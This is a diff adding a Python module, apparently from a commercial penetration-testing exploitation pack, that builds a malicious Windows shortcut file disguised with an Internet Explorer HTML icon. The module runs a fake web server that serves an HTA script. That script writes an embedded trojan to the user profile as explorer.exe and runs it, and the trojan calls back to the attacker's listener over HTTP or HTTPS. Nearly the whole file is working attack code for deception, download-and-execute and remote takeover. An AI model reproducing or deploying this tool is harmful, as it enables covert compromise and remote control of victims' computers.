@@ -1,0 +1,389 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+import sys
+import random
+import time
+import thread
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from httpclientside import httpclientside
+from canvasexploit import canvasexploit
+from libs.canvasos import *
+from MOSDEF import pelib 
+from libs.spkproxy import header, body
+from shellcode import shellcodeGenerator
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "Generic Malicous Shortcut file"
+
+DESCRIPTION = "Generic Malicous Shortcut file"
+
+DOCUMENTATION = {}
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = """
+With this tool you can create a malicious shortcut file (.lnk extension) which will download and
+execute a HTTP/HTTPS MOSDEF trojan. It uses an Internet Explorer HTML file icon to be stealth.
+"""
+
+VERSION = "0.1"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Clientside'
+PROPERTY['ARCH'] = [['Windows']]
+PROPERTY['VERSION'] = ['2000','XP']
+
+NOTES="""
+Usage:
+.\commandlineInterface.py -p 443 -v 13
+.\d2sec_lnk.py -l 192.168.52.1 -d 443 -O dstlnk:index.html.lnk -O useSSL:1
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit(tcpexploit):
+	def __init__(self):
+		tcpexploit.__init__(self)        
+		
+		self.name = NAME
+		self.srclnk = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_lnk/document.html.lnk"
+		self.dstlnk = "newdoc.html.lnk"		
+		self.trojanname = "index.hta"
+		self.webip = "127.0.0.1"
+		self.webport = 80
+		self.callip = "127.0.0.1"
+		self.callport = 443
+		self.useSSL = 0
+		self.gui_update = True
+		
+		return
+
+
+	def gui_hook_function(self):        			
+		node = self.engine.localnode
+		node.getallips()		
+		itflist = node.interfaces.all_interfaces()
+		
+		for i in itflist:
+			tmpifc = node.interfaces.get_interface(i)
+			if tmpifc.activated:
+				self.callip = tmpifc.ip
+				self.webip = tmpifc.ip
+				
+		info = [("callip", self.callip), ("webip", self.webip)]
+		
+		return info
+
+        
+	# Create the hta file with the embedded binary
+	def file4hta(self, exename):
+		evilprog = "explorer.exe"
+		e = []
+		
+		for a in exename:
+			for b in a:
+				if b == "\r":
+					d = "0d"
+				elif b == "\n":
+					d = "0a"
+				elif b == "\0":
+					d = "00"
+				else:
+					c = hex(ord(b))
+					d = c.replace("0x", "")
+	
+				if len(d) == 1:
+					d = "0"+d
+	
+				e.append(d)
+		
+		i = 0
+		j = 0
+		l = len(e)
+	
+		hta = "<SCRIPT language=vbs>\n\n"
+		while 1:
+		  hta += " prog = prog & \""
+	
+		  while i != 24:
+		    hta += "%s," % e[j]
+		    if j == l-1:
+		      break
+		    i += 1
+		    j += 1
+	
+		  if j == l-1:
+		    hta = hta[:-1] + "\"\n\n"
+		    break
+		  hta += "\"\n"
+		  i = 0
+	
+		hta += " tmp = Split(prog, \",\")\n"	
+		hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
+		hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
+		hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
+		hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
+		hta += " Set f = fso.CreateTextFile(path, True)\n\n"
+		hta += " For i = 0 To UBound(tmp)\n"
+		hta += "   prog = Int(\"&H\" & tmp(i))\n"
+		hta += "   f.Write Chr(prog)\n"
+		hta += " Next\n\n"
+		hta += " f.Close\n"
+		hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
+		hta += " self.Close\n"
+		hta += "</SCRIPT>\n"
+	
+		return hta 
+		
+		
+	def maketrojan(self):
+		host = self.callback.ip
+		port = self.callback.port		
+		
+		sc = shellcodeGenerator.win32()
+		sc.addAttr("findeipnoesp", {"subespval":0x1000})                		
+		                        	
+		if self.useSSL:
+			ssl = "s"
+		else:
+			ssl = ""                		
+		                    
+		sc.addAttr("httpGetShellcode", {"URL":"http%s://%s:%d/w" % (ssl, host, port)})		
+		shellcode = sc.get()        		
+		myPElib = pelib.PElib()		
+		
+		self.mosdeftrojan = myPElib.createPEFileBuf(shellcode)
+        
+		self.log("Writing out %d bytes to %s" % (len(self.mosdeftrojan), self.trojanname))
+
+		self.htafile = self.file4hta(self.mosdeftrojan)
+		
+		file(self.trojanname, "wb").write(self.htafile)
+		self.setInfo("%s - done" % (NAME))
+		ret = len(self.mosdeftrojan) != 0
+        
+		return ret
+
+
+	def makesploit(self, clientheader, clientbody):        		
+		h = header('SERVER')
+		b = body()
+		
+		self.maketrojan()
+		        
+		if clientheader.URL.count(self.trojanname):
+			self.log("Sending MOSDEF trojan")
+			f = open(self.trojanname, "rb")
+			sploitstring = f.read()
+			f.close()
+			os.remove(self.trojanname)
+			self.log("Sending %d bytes"%len(sploitstring))
+			h.addHeader("Content-type","binary/octet-stream")
+			h.addHeader("Connection","close")
+			b.setBody(sploitstring)
+		
+		return h, b
+
+
+  #################################################################################################################
+  # Code from httpserver.py
+	def listen(self):		
+		s = self.gettcplistener(self.webport, self.webip)
+
+		if not s:
+			self.log("Cannot listen on port 80 - perhaps that port is already bound?")
+			return 0
+				
+		s.set_timeout(5)
+		self.s=s
+		
+		return s 
+
+
+	def accept(self, s=None ):
+		"""
+		Try to accept one connection
+		returns true if we found one
+		"""
+		#we loop on this ,so no annoying printouts here
+		#self.log("Accepting connection")
+		if s==None:
+			s=self.s 
+		try:
+			infd,addr=s.accept()
+		except timeoutsocket.Timeout:
+			#self.log("Timed out - no accept yet")
+			return 
+		if infd==-1:
+			return
+		
+		#else we have an infd
+		self.handle(infd)
+		
+		return True #handled connection
+      
+        
+	def handle(self, infd): 
+		self.log("Handling connection")
+		clientheader = header(state = "SERVER")
+		clientheader.ssl = self.ssl
+		ret = clientheader.readdata(infd)
+		clientbody = body()
+        
+		if clientheader.gotGoodHeader():
+			if clientheader.bodySize()>0 or clientheader.wasChunked:
+				self.log("Reading body")
+				clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
+				self.log("Read body")
+		
+		self.log("Creating exploit response")
+		
+		servheader,servbody = self.makesploit(clientheader,clientbody)
+		
+		self.log("Responding")
+		
+		bodydata="".join(servbody.data)
+		            
+		#now we respond...
+		response = ""
+		response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)
+	
+	
+		self.log(response)
+
+		for akey in servheader.headerValuesDict.keys():
+			if akey not in [ "Content-Length", "Content-length"]:
+				response += servheader.grabHeader(akey)
+				
+		self.log("Sending header data of %d bytes"%len(response))
+		chunked=0 #for now, eventually we'll send random chunks down the pipe.\..
+		
+		if not chunked:
+			response+="Content-Length: "+str(len(bodydata))+"\r\n"
+			
+		response+="\r\n"
+		response+="".join(bodydata)
+		self.log("Total response length is %d bytes"%len(response))
+		
+		try:
+			infd.sendall(response)
+		except socket.error:
+			self.log("Connection closed by peer")
+			
+		self.log("Response sent")
+		infd.close() #connection close - later on we'll keep it.
+		
+		return 
+	#
+	#################################################################################################################
+        
+
+	def startHTTPServer(self):
+		s=self.listen()
+        
+		if not s:
+			self.log("Failed to listen - not running")
+			return 0
+			
+		while 1:
+			if self.state==self.HALT:
+				self.s.close()
+				break
+			self.accept()
+
+		self.setInfo("%s on %s:%d - done (success!)"%(NAME, self.bindip, self.port))
+        
+		return 1
+
+		
+	def getArgs(self):
+		self.dstlnk = self.argsDict.get("dstlnk", self.dstlnk)		
+		
+		# Fake web server arguments
+		self.webip = self.argsDict.get("webip", self.webip)
+		self.webport = int(self.argsDict.get("webport", self.webport))
+		
+		# MOSDEF arguments
+		self.callip = self.argsDict.get("callip", self.callip)	
+		self.callport = int(self.argsDict.get("callport", self.callport))				
+		self.useSSL = int(self.argsDict.get("useSSL", self.useSSL))
+			
+		return
+
+	def run(self):
+		self.getArgs()
+		
+		node = self.engine.localnode
+		node.getallips()
+		interface = node.interfaces.get_ip(self.callip)
+
+		if self.useSSL:
+			self.callback = self.engine.start_listener(interface, canvasengine.HTTPMOSDEF_SSL, self.callport)		
+		else:
+			self.callback = self.engine.start_listener(interface, canvasengine.HTTPMOSDEF, self.callport)		
+		
+		# Open original CHM file
+		f = open(self.srclnk, "rb")
+		buff = f.read()
+		f.close()
+								
+		# URL
+		url = "http://" + self.webip + ":" + str(self.webport) + "/" + self.trojanname
+		url = url + "#"*(220 - len(url))
+		
+		# Encode in UNICODE
+		encodedurl = ""
+		
+		for i in url:
+			encodedurl += "\x00" + i
+		
+		# Search string
+		str1 = "\x00\x41" + "\x00X" * 219
+		
+		# Replace with new URL
+		buff = buff.replace(str1, encodedurl, 1)
+		
+		f = open(self.dstlnk, "wb")
+		f.write(buff)
+		f.close()
+
+		self.log("New Shortcut file %s created" % self.dstlnk)
+		
+		thread.start_new_thread(self.startHTTPServer,())
+		
+		self.log("Fake HTTP server started")
+
+		while 1:
+			time.sleep(1)
+		
+		return 0
+		
+
+	def usage(self):        
+		print "Usage: %s -O dstlnk:dest_lnk_path -O webip:fakewebip -O webport:fakewebport -O callip:callbackip -O callport:callbackport [-O useSSL:[0|1]]\n" % sys.argv[0]
+		sys.exit(0) 
+
+
+if __name__=='__main__':
+	app = theexploit()
+	ret = standard_callback_commandline(app)
+
